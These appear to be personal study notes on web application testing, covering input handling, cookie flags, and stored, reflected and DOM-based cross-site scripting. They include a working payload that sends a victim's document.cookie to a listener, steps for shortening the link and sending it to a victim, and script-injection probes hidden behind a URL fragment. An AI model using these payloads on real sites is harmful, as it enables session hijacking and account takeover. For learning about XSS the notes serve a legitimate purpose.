Don't rely on the Burp Suite scanner.

Check to see if it has multiple input fields and if you can change them from matching to not matching while still having the program accept the input.

Basic log in form
```html
<html>
<head>
<title>My Forem</title>
<body>

<div>
<h3> Super Secret Creds</h3>
	<div>
		<form>
				</br>
				Username:
				</br>
				<input type="text" name="Username" value="joe">
				</br>
				Password:
				<input type="password" name="password" value="password">
				</input>
		<form>
	<div>			
				
</div>

</body>
</head>
</html>
```

It should have been body then head in html. I can change this later.

Encoding
will change characters into something else with the same as operation:
```html
Encoding

<script>

<!-- changes the code into something else before it hits the server, but it will still work the same -->
< == &lt:

<!-- What it will look like as it hits the server -->
&lt:/script>
```

Filtering is almost the same but instead of changing it it just deletes it.
Validation is a predefined allow/disallow list, and lastly sanitization is a combination of all of these options. 

---

Look for anywhere on the site that takes input and test out how it responds.

Cookies:
- If HTTP Only flag is not set, it will not be able prevent cookies from being stolen with a document.cookie XSS.
- Secure flag prevents the cookie from being seen in clear text.
- HTTP only and Secure flag should always be set.

---

Comments to the website might be limited, in this case use burpsuite, or see if you can change anything in dev tools to increase message length.

**Stored XSS:** _Malicious code is stored on the website, any user can see it._

- Can be used to steal session cookies, sending it it to an attacker who would them be able to hijack the session, giving them access to the account.  

**Reflected XSS:** _Input is being reflected on the web-page back at the user. The response, unlike stored XSS, is not stored on the server._

- To exploit to vulnerability and steal cookies, you would have to modify the url of the payload, and send it to a victim who would click the link. 

```php
www.example.com/name-reflected/?name=<Payload>
```

Payload

```java
<script> var xhr = new XMLHttpRequest(); xhr.open('GET','http://localhost:1337/${document.cookie}', false); xhr.send(null); </script>
```


1. URL encode the malicious link: https://www.shorturl.at/
2. Start Apache server
3. Send link to the victim

**DOM XSS:** _Document Object Model: HTML representation in memory that is created by the browser. 
1. You can view the DOM in dev-tools inspect tab. 
2. JavaScript is used to give structure to the DOM.
3. If the default parameter has `decodeURI(lang)`, it might be vulnerable to DOM XSS. 

`www.example.com/app/lang/?default=German`

```php
www.example.com/app/lang/?default=<script>alert(1)</script>
```


The client itself is what creates the malicious payload in a DOM based attack. In reflected XSS it's the server that reflects it back to the client. 

**Stored:** Malicious payload is stored on the server and distributed to everyone.
**Reflected:** We create a a request with a malicious payload, then the server return the payload in the response.
**DOM:** The server does not put the payload into the HTML directly, instead the server returns with the applications JavaScript, and it's the initial JavaScript that inserts the malicious payload into the DOM, and then executed. 

Hide the payload from the server by adding a comment.

```php
www.example.com/app/lang/#?default=<script>alert(1)</script>
```

- If using reflected XSS you could use this to hide the request from the server.

**DOM Security:**

1. Session cookies.
2. Content security policy.